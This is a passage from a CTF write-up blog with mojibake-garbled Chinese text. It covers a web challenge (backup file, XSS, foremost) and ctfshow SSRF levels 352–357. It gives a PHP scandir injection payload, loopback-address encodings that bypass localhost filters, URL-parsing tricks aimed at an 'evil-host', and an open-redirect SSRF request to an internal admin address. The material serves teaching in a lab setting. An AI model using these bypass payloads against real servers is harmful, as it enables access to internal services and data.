<p>var_dump() å‡½æ•°ç”¨äºè¾“å‡ºå˜é‡çš„ç›¸å…³ä¿¡æ¯ã€‚<br>var_dump() å‡½æ•°æ˜¾ç¤ºå…³äºä¸€ä¸ªæˆ–å¤šä¸ªè¡¨è¾¾å¼çš„ç»“æ„ä¿¡æ¯ï¼ŒåŒ…æ‹¬è¡¨è¾¾å¼çš„ç±»å‹ä¸å€¼ã€‚æ•°ç»„å°†é€’å½’å±•å¼€å€¼ï¼Œé€šè¿‡ç¼©è¿›æ˜¾ç¤ºå…¶ç»“æ„ã€‚<br>Scandir()ï¼šåˆ—å‡º å‚æ•°ç›®å½• ä¸­çš„æ–‡ä»¶å’Œç›®å½•</p>
</blockquote>
<p>**åŠ è½½?num&#x3D;var_dump(scandir(chr(47)))**ä¹Ÿå°±æ˜¯var_dump(â€œ&#x2F;â€œ)ï¼Œå°±å¯ä»¥å¾—åˆ°flagã€‚</p>
<h2 id="é»‘å¿ƒçš„ç½‘ç«™"><a href="#é»‘å¿ƒçš„ç½‘ç«™" class="headerlink" title="é»‘å¿ƒçš„ç½‘ç«™"></a>é»‘å¿ƒçš„ç½‘ç«™</h2><p><img src="https://img-blog.csdnimg.cn/53061123fbfa4e4983c58136f462d8f0.png" alt="1"><br>æŸ¥çœ‹æºç <br><img src="https://img-blog.csdnimg.cn/3e31a950eef94314959c25f74b06896c.png" alt="25"><br>dirsearchæ‰«ä¸€ä¸‹å¾—åˆ°å¤‡ä»½æ–‡ä»¶<br><img src="https://img-blog.csdnimg.cn/5c19ee13d99a4795b1a6fbc952613dec.png" alt="3"><br>å†…å®¹ä¸ºï¼š</p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Content-type: text/html;charset=utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token comment">//error_reporting(0);</span>

<span class="token comment">//è®¾ç½®é¶æœºæ‰€åœ¨è·¯å¾„</span>
<span class="token variable">$site_root</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"/NFPC"</span><span class="token punctuation">;</span>

<span class="token comment">//è®¾ç½®ä¸Šä¼ ç›®å½•</span>
<span class="token variable">$UPLOAD_ADDR</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"../upload/"</span><span class="token punctuation">;</span>

<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><img src="https://img-blog.csdnimg.cn/f6421facbd144e92b789f7a2415345d8.png" alt="5"><br>æ‰¾åˆ°<br><img src="https://img-blog.csdnimg.cn/af5a997fc70e43bf804179d0905dd5bc.png" alt="6"><br>å‘ç°xssæ¼æ´<br><img src="https://img-blog.csdnimg.cn/476ec9c4fb6d4fd6977334c8f528999e.png" alt="7"><br>å‘ç°scriptè¢«è¿‡æ»¤ï¼Œ<br><img src="https://img-blog.csdnimg.cn/d5a6de988010492882ada878665ac939.png" alt="2"><strong>&lt;&gt;<strong>è¢«è½¬ä¹‰ï¼Œé‚£å°±é—­åˆ<br><img src="https://img-blog.csdnimg.cn/6e25dae7e7734c799d07bd78fc542e68.png" alt="6"><br>æˆåŠŸï¼ï¼ï¼</strong>WAxiangxiangzuichaofan&#x2F;flag</strong><br>å¾—åˆ°ä¸€ä¸ªæ–‡ä»¶ï¼Œçœ‹åˆ°æ–‡ä»¶å°¾æœ‰ç‰¹å¾ï¼Œç”¨foremoståˆ†ç¦»æ–‡ä»¶ï¼Œ<br><img src="https://img-blog.csdnimg.cn/6d40bf494d20431aa41b44c8025e13df.png" alt="9">    </p>
<blockquote>
<pre><code>-V-æ˜¾ç¤ºç‰ˆæƒä¿¡æ¯å¹¶é€€å‡º
-t-æŒ‡å®šæ–‡ä»¶ç±»å‹ã€‚ï¼ˆ-t jpegï¼Œpdfâ€¦ï¼‰
-d-å¯ç”¨é—´æ¥å—æ£€æµ‹ï¼ˆå¯¹äºUNIXæ–‡ä»¶ç³»ç»Ÿï¼‰
-i-æŒ‡å®šè¾“å…¥æ–‡ä»¶ï¼ˆé»˜è®¤ä¸ºstdinï¼‰
-a-å†™å…¥æ‰€æœ‰æ ‡å¤´ï¼Œä¸æ‰§è¡Œé”™è¯¯æ£€æµ‹ï¼ˆæŸåçš„æ–‡ä»¶ï¼‰
-w-ä»…å†™å…¥å®¡æ ¸æ–‡ä»¶ï¼Œä¸å°†ä»»ä½•æ£€æµ‹åˆ°çš„æ–‡ä»¶å†™å…¥ç£ç›˜
-o-è®¾ç½®è¾“å‡ºç›®å½•ï¼ˆé»˜è®¤ä¸ºè¾“å‡ºï¼‰
-c-è®¾ç½®è¦ä½¿ç”¨çš„é…ç½®æ–‡ä»¶ï¼ˆé»˜è®¤ä¸ºforest.confï¼‰
-q-å¯ç”¨å¿«é€Ÿæ¨¡å¼ã€‚åœ¨512å­—èŠ‚è¾¹ç•Œä¸Šæ‰§è¡Œæœç´¢ã€‚
-Q-å¯ç”¨é™éŸ³æ¨¡å¼ã€‚æŠ‘åˆ¶è¾“å‡ºæ¶ˆæ¯ã€‚
-v-å†—ä½™æ¨¡å¼ã€‚å°†æ‰€æœ‰æ¶ˆæ¯è®°å½•åˆ°å±å¹•ã€‚
</code></pre>
</blockquote>
<p>å¾—åˆ°åˆ†ç¦»çš„æ–‡ä»¶ï¼Œæœ‰flagã€‚<br><img src="https://img-blog.csdnimg.cn/09154bd7f7ab4779b08279e726f80343.png" alt="12"></p>
]]></content>
      <categories>
        <category>èµ›äº‹WP</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>ctfshow-SSRF</title>
    <url>/2023/03/02/ctfshow-SSRF/</url>
    <content><![CDATA[<link rel="stylesheet" class="aplayer-secondary-style-marker" href="\assets\css\APlayer.min.css"><script src="\assets\js\APlayer.min.js" class="aplayer-secondary-script-marker"></script><meta name="referrer" content="no-referrer"/>

<h2 id="å¸¸è§ç»•è¿‡"><a href="#å¸¸è§ç»•è¿‡" class="headerlink" title="å¸¸è§ç»•è¿‡"></a>å¸¸è§ç»•è¿‡</h2><h3 id="1"><a href="#1" class="headerlink" title="1"></a>1</h3><p>å½“<strong>127.0.0.1</strong>è¢«è¿‡æ»¤æ—¶ï¼Œå¯ä»¥ä½¿ç”¨<strong>127.1</strong> <strong>0</strong> <strong>0.0.0.0</strong>  <strong>sudo.cc</strong> <strong>017700000001</strong> <strong>2130706433</strong> ç­‰ç­‰ã€‚å¦‚æœæŸäº›å­—ç¬¦ä¸²è¢«è¿‡æ»¤äº†ï¼Œå°è¯•å¯¹å­—ç¬¦ä¸²è¿›è¡Œä¸¤æ¬¡urlç¼–ç ã€‚</p>
<h3 id="SSRFå…·æœ‰åŸºäºç™½åå•çš„è¾“å…¥è¿‡æ»¤å™¨"><a href="#SSRFå…·æœ‰åŸºäºç™½åå•çš„è¾“å…¥è¿‡æ»¤å™¨" class="headerlink" title="SSRFå…·æœ‰åŸºäºç™½åå•çš„è¾“å…¥è¿‡æ»¤å™¨"></a>SSRFå…·æœ‰åŸºäºç™½åå•çš„è¾“å…¥è¿‡æ»¤å™¨</h3><p>æŸäº›åº”ç”¨ç¨‹åºåªå…è®¸ä¸å…è®¸å€¼çš„ç™½åå•åŒ¹é…ã€ä»¥å…¶å¼€å¤´æˆ–åŒ…å«å…¶çš„è¾“å…¥ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œæœ‰æ—¶å¯ä»¥åˆ©ç”¨URLè§£æä¸­çš„ä¸ä¸€è‡´æ€§æ¥ç»•è¿‡è¿‡æ»¤å™¨ã€‚</p>
<pre class="line-numbers language-javascript" data-language="javascript"><code class="language-javascript"><span class="token constant">URL</span>è§„èŒƒåŒ…å«è®¸å¤šåœ¨å®ç°å¯¹<span class="token constant">URL</span>çš„å³å¸­è§£æå’ŒéªŒè¯æ—¶å®¹æ˜“è¢«å¿½ç•¥çš„ç‰¹æ€§ï¼š

<span class="token number">1</span>ã€å¯ä»¥ä½¿ç”¨@å­—ç¬¦åœ¨ä¸»æœºåä¹‹å‰çš„ <span class="token constant">URL</span> ä¸­åµŒå…¥å‡­æ®ã€‚ ä¾‹å¦‚ï¼š
    <span class="token literal-property property">https</span><span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>expected<span class="token operator">-</span><span class="token function">host</span><span class="token punctuation">(</span>é¢„æœŸä¸»æœº<span class="token punctuation">)</span>@evil<span class="token operator">-</span><span class="token function">host</span><span class="token punctuation">(</span>æ¶æ„ä¸»æœº<span class="token punctuation">)</span>

<span class="token number">2</span>ã€å¯ä»¥ä½¿ç”¨ # å­—ç¬¦æ¥è¡¨ç¤º <span class="token constant">URL</span> ç‰‡æ®µã€‚ä¾‹å¦‚ï¼š
    httpsï¼š<span class="token comment">//evil-host(æ¶æ„ä¸»æœº)#expected-host(é¢„æœŸä¸»æœº)</span>

<span class="token number">3</span>ã€å¯ä»¥åˆ©ç”¨<span class="token constant">DNS</span>å‘½åå±‚æ¬¡ç»“æ„å°†æ‰€éœ€çš„è¾“å…¥æ”¾å…¥æ‚¨æ§åˆ¶çš„å®Œå…¨é™å®š<span class="token constant">DNS</span>åç§°ä¸­ã€‚ä¾‹å¦‚ï¼š
    <span class="token literal-property property">https</span><span class="token operator">:</span><span class="token operator">/</span><span class="token operator">/</span>expected<span class="token operator">-</span>host<span class="token punctuation">.</span>evil<span class="token operator">-</span>host

<span class="token number">4</span>ã€å¯ä»¥å¯¹å­—ç¬¦è¿›è¡Œ<span class="token constant">URL</span>ç¼–ç ä»¥æ··æ·†<span class="token constant">URL</span>åˆ†æä»£ç ã€‚å¦‚æœå®ç°ç­›é€‰å™¨çš„ä»£ç ä¸æ‰§è¡Œåç«¯<span class="token constant">HTTP</span>è¯·æ±‚çš„ä»£ç å¤„ç†<span class="token constant">URL</span>ç¼–ç çš„å­—ç¬¦çš„æ–¹å¼ä¸åŒï¼Œåˆ™è¿™ä¸€ç‚¹ç‰¹åˆ«æœ‰ç”¨

<span class="token number">5</span>ã€å¯ä»¥å°†è¿™äº›æŠ€æœ¯ç»“åˆä½¿ç”¨<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<h3 id="é€šè¿‡å¼€æ”¾é‡å®šå‘ç»•è¿‡-SSRF-è¿‡æ»¤å™¨"><a href="#é€šè¿‡å¼€æ”¾é‡å®šå‘ç»•è¿‡-SSRF-è¿‡æ»¤å™¨" class="headerlink" title="é€šè¿‡å¼€æ”¾é‡å®šå‘ç»•è¿‡ SSRF è¿‡æ»¤å™¨"></a>é€šè¿‡å¼€æ”¾é‡å®šå‘ç»•è¿‡ SSRF è¿‡æ»¤å™¨</h3><p>æœ‰æ—¶å¯ä»¥é€šè¿‡åˆ©ç”¨å¼€æ”¾é‡å®šå‘æ¼æ´æ¥è§„é¿ä»»ä½•ç±»å‹çš„åŸºäºè¿‡æ»¤å™¨çš„é˜²å¾¡ã€‚</p>
<p>åœ¨å‰é¢çš„ SSRF ç¤ºä¾‹ä¸­ï¼Œå‡è®¾ç”¨æˆ·æäº¤çš„ URL è¢«ä¸¥æ ¼éªŒè¯ä»¥é˜²æ­¢æ¶æ„åˆ©ç”¨ SSRF è¡Œä¸ºã€‚ä½†æ˜¯ï¼Œå…è®¸ä½¿ç”¨ URL çš„åº”ç”¨ç¨‹åºå­˜åœ¨å¼€æ”¾é‡å®šå‘æ¼æ´ã€‚å¦‚æœç”¨äºå‘å‡ºåç«¯ HTTP è¯·æ±‚çš„ API æ”¯æŒé‡å®šå‘ï¼Œæ‚¨å¯ä»¥æ„å»ºä¸€ä¸ªæ»¡è¶³è¿‡æ»¤å™¨çš„ URLï¼Œå¹¶å°†è¯·æ±‚é‡å®šå‘åˆ°æ‰€éœ€çš„åç«¯ç›®æ ‡ã€‚</p>
<p>ä¾‹å¦‚ï¼Œå‡è®¾åº”ç”¨ç¨‹åºåŒ…å«ä¸€ä¸ªå¼€æ”¾é‡å®šå‘æ¼æ´ï¼Œå…¶ä¸­åŒ…å«ä»¥ä¸‹ URLï¼š</p>
<pre class="line-numbers language-none"><code class="language-none">&#x2F;product&#x2F;nextProduct?currentProductId&#x3D;6&amp;path&#x3D;http:&#x2F;&#x2F;evil-user.net<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>è¿”å›é‡å®šå‘åˆ°ï¼š</p>
<pre class="line-numbers language-none"><code class="language-none">http:&#x2F;&#x2F;evil-user.net<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>å¯ä»¥åˆ©ç”¨å¼€æ”¾é‡å®šå‘æ¼æ´ç»•è¿‡URLè¿‡æ»¤ï¼Œåˆ©ç”¨SSRFæ¼æ´ï¼Œæ–¹æ³•å¦‚ä¸‹ï¼š</p>
<pre class="line-numbers language-none"><code class="language-none">POST &#x2F;product&#x2F;stock HTTP&#x2F;1.0 Content-Type: application&#x2F;x-www-form-urlencoded Content-Length: 118 stockApi&#x3D;http:&#x2F;&#x2F;weliketoshop.net&#x2F;product&#x2F;nextProduct?currentProductId&#x3D;6&amp;path&#x3D;http:&#x2F;&#x2F;192.168.0.68&#x2F;admin<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>

<p>æ­¤ SSRF æ¼æ´åˆ©ç”¨ä¹‹æ‰€ä»¥æœ‰æ•ˆï¼Œæ˜¯å› ä¸ºåº”ç”¨ç¨‹åºé¦–å…ˆéªŒè¯æä¾›çš„<code>stockAPI</code>URL æ˜¯å¦ä½äºå…è®¸çš„åŸŸä¸­ï¼Œè€Œäº‹å®ç¡®å®å¦‚æ­¤ã€‚ç„¶ååº”ç”¨ç¨‹åºè¯·æ±‚æä¾›çš„ URLï¼Œè¿™ä¼šè§¦å‘æ‰“å¼€é‡å®šå‘ã€‚å®ƒéµå¾ªé‡å®šå‘ï¼Œå¹¶å‘æ”»å‡»è€…é€‰æ‹©çš„å†…éƒ¨ URL å‘å‡ºè¯·æ±‚ã€‚</p>
<h2 id="352-353"><a href="#352-353" class="headerlink" title="352 353"></a>352 353</h2><p><strong>352</strong></p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$url</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$x</span><span class="token operator">=</span><span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$x</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'scheme'</span><span class="token punctuation">]</span><span class="token operator">===</span><span class="token string single-quoted-string">'http'</span><span class="token operator">||</span><span class="token variable">$x</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'scheme'</span><span class="token punctuation">]</span><span class="token operator">===</span><span class="token string single-quoted-string">'https'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/localhost|127.0.0/'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
<span class="token variable">$ch</span><span class="token operator">=</span><span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_HEADER</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_RETURNTRANSFER</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$result</span><span class="token operator">=</span><span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">else</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hacker'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">else</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hacker'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span> hacker<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<p><strong>353</strong></p>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$url</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$x</span><span class="token operator">=</span><span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$x</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'scheme'</span><span class="token punctuation">]</span><span class="token operator">===</span><span class="token string single-quoted-string">'http'</span><span class="token operator">||</span><span class="token variable">$x</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'scheme'</span><span class="token punctuation">]</span><span class="token operator">===</span><span class="token string single-quoted-string">'https'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token function">preg_match</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'/localhost|127\.0\.|\ã€‚/i'</span><span class="token punctuation">,</span> <span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
<span class="token variable">$ch</span><span class="token operator">=</span><span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_HEADER</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_RETURNTRANSFER</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$result</span><span class="token operator">=</span><span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token variable">$result</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">else</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hacker'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span>
<span class="token keyword">else</span><span class="token punctuation">&#123;</span>
    <span class="token keyword">die</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'hacker'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>
<span class="token delimiter important">?></span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><a href="https://www.php.net/manual/zh/function.parse-url.php"><strong>parse_url</strong> </a></p>
<blockquote>
<p>parse_url â€” è§£æ URLï¼Œè¿”å›å…¶ç»„æˆéƒ¨åˆ†</p>
</blockquote>
<blockquote>
<p>curl_setopt â€” è®¾ç½®ä¸€ä¸ªcURLä¼ è¾“é€‰é¡¹</p>
<p>ch</p>
<p>ç”± curl_init() è¿”å›çš„ cURL å¥æŸ„ã€‚</p>
<p>option</p>
<p>éœ€è¦è®¾ç½®çš„CURLOPT_XXXé€‰é¡¹ã€‚</p>
<p>value</p>
<p>å°†è®¾ç½®åœ¨optioné€‰é¡¹ä¸Šçš„å€¼ã€‚</p>
</blockquote>
<pre class="line-numbers language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>

<span class="token comment">//åˆå§‹åŒ–ä¸€ä¸ªcURLä¼šè¯</span>
<span class="token variable">$ch</span> <span class="token operator">=</span> <span class="token function">curl_init</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">//è®¾å®šè¯·æ±‚çš„RUL</span>
<span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_URL</span><span class="token punctuation">,</span> <span class="token string single-quoted-string">'www.baidu.com'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">//è®¾å®šè¿”å›ä¿¡æ¯ä¸­åŒ…å«å“åº”ä¿¡æ¯å¤´</span>
<span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_HEADER</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">// 	å¯ç”¨æ—¶ä¼šå°†å¤´æ–‡ä»¶çš„ä¿¡æ¯ä½œä¸ºæ•°æ®æµè¾“å‡ºã€‚ </span>
<span class="token comment">//å‚æ•°ä¸º1è¡¨ç¤ºè¾“å‡ºä¿¡æ¯å¤´,ä¸º0è¡¨ç¤ºä¸è¾“å‡º</span>



<span class="token comment">//è®¾å®šcurl_exec()å‡½æ•°å°†å“åº”ç»“æœè¿”å›ï¼Œè€Œä¸æ˜¯ç›´æ¥è¾“å‡º</span>
<span class="token function">curl_setopt</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">,</span> <span class="token constant">CURLOPT_RETURNTRANSFER</span><span class="token punctuation">,</span> <span class="token constant boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">//TRUE å°†curl_exec()è·å–çš„ä¿¡æ¯ä»¥å­—ç¬¦ä¸²è¿”å›ï¼Œè€Œä¸æ˜¯ç›´æ¥è¾“å‡ºã€‚ </span>
<span class="token comment">//å‚æ•°ä¸º1è¡¨ç¤º$html,ä¸º0è¡¨ç¤ºecho $html</span>





<span class="token comment">//æ‰§è¡Œä¸€ä¸ªcURLä¼šè¯</span>
<span class="token variable">$html</span> <span class="token operator">=</span> <span class="token function">curl_exec</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">//å…³é—­ä¸€ä¸ªsurlä¼šè¯</span>
<span class="token function">curl_close</span><span class="token punctuation">(</span><span class="token variable">$ch</span><span class="token punctuation">)</span><span class="token punctuation">;</span>

<span class="token comment">//è¾“å‡ºè¿”å›ä¿¡æ¯  å¦‚æœCURLOPT_RETURNTRANSFERå‚æ•°ä¸ºfasleå¯çœç•¥</span>
<span class="token comment">//echo $html;</span></span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
<pre><code>127.1ä¼šè¢«è§£ææˆ127.0.0.1ï¼Œä¹Ÿå°±æ„å‘³ç€ä¸ºé›¶å¯ç¼ºçœ
åœ¨Linuxä¸­ï¼Œ0ä¹Ÿä¼šè¢«è§£ææˆ127.0.0.1
127.0.0.0/8æ˜¯ä¸€ä¸ªç¯å›åœ°å€ç½‘æ®µï¼Œä»127.0.0.1 ~ 127.255.255.254éƒ½è¡¨ç¤ºlocalhost
ipåœ°å€è¿˜å¯ä»¥é€šè¿‡è¡¨ç¤ºæˆå…¶ä»–è¿›åˆ¶çš„å½¢å¼è®¿é—®ï¼ŒIPåœ°å€äºŒè¿›åˆ¶ã€åè¿›åˆ¶ã€åå…­è¿›åˆ¶äº’æ¢
</code></pre>
<p><img src="https://img-blog.csdnimg.cn/168e616aefc948da8c4c5279035d9f78.png" alt="1"></p>
<blockquote>
<p>åè¿›åˆ¶æ•´æ•°ï¼šurl&#x3D;<a href="http://127.0.0.1/flag.php">http://2130706433/flag.php</a><br>åå…­è¿›åˆ¶ï¼šurl&#x3D;<a href="http://127.0.0.1/flag.php">http://0x7F.0.0.1/flag.php</a><br>å…«è¿›åˆ¶ï¼šurl&#x3D;<a href="http://127.0.0.1/flag.php">http://0177.0.0.1/flag.php</a><br>åå…­è¿›åˆ¶æ•´æ•°ï¼šurl&#x3D;<a href="http://127.0.0.1/flag.php">http://0x7F000001/flag.php</a> ç¼ºçœæ¨¡å¼ï¼š127.0.0.1å†™æˆ127.1<br>CIDRï¼šurl&#x3D;<a href="http://127.127.127.127/flag.php%E5%92%8C">http://127.127.127.127/flag.phpå’Œ</a> url&#x3D;<a href="http://0.0.0.0/flag.php">http://0/flag.php</a><br>url&#x3D;<a href="http://0.0.0.0/flag.php">http://0.0.0.0/flag.php</a></p>
</blockquote>
<h2 id="354"><a href="#354" class="headerlink" title="354"></a>354</h2><p>ä½¿ç”¨<strong><a href="http://sudo.cc/">http://sudo.cc</a></strong>è¿™ä¸ªåŸŸåæ˜¯æŒ‡å‘127.0.0.1çš„ã€‚<br>payloadï¼š<code>url=http://sudo.cc/flag.php</code></p>
<h2 id="355"><a href="#355" class="headerlink" title="355"></a>355</h2><p>payload:<code>url=http://0/flag.php</code></p>
<h2 id="356"><a href="#356" class="headerlink" title="356"></a>356</h2><p>payload:<code>url=http://0/flag.php</code></p>
<h2 id="357"><a href="#357" class="headerlink" title="357"></a>357</h2><pre class="line-numbers language-php" data-language="php"><code class="language-php"> <span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">highlight_file</span><span class="token punctuation">(</span><span class="token constant">__FILE__</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$url</span><span class="token operator">=</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'url'</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
<span class="token variable">$x</span><span class="token operator">=</span><span class="token function">parse_url</span><span class="token punctuation">(</span><span class="token variable">$url</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token variable">$x</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'scheme'</span><span class="token punctuation">]</span><span class="token operator">===</span><span class="token string single-quoted-string">'http'</span><span class="token operator">||</span><span class="token variable">$x</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'scheme'</span><span class="token punctuation">]</span><span class="token operator">===</span><span class="token string single-quoted-string">'https'</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
<span class="token variable">$ip</span> <span class="token operator">=</span> <span class="token function">gethostbyname</span><span class="token punctuation">(</span><span class="token variable">$x</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'host'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token string single-quoted-string">'&lt;/br>'</span><span class="token operator">.</span><span class="token variable">$ip</span><span class="token operator">.</span><span class="token string single-quoted-string">'&lt;/br>'</span><span class="token punctuation">;</span>
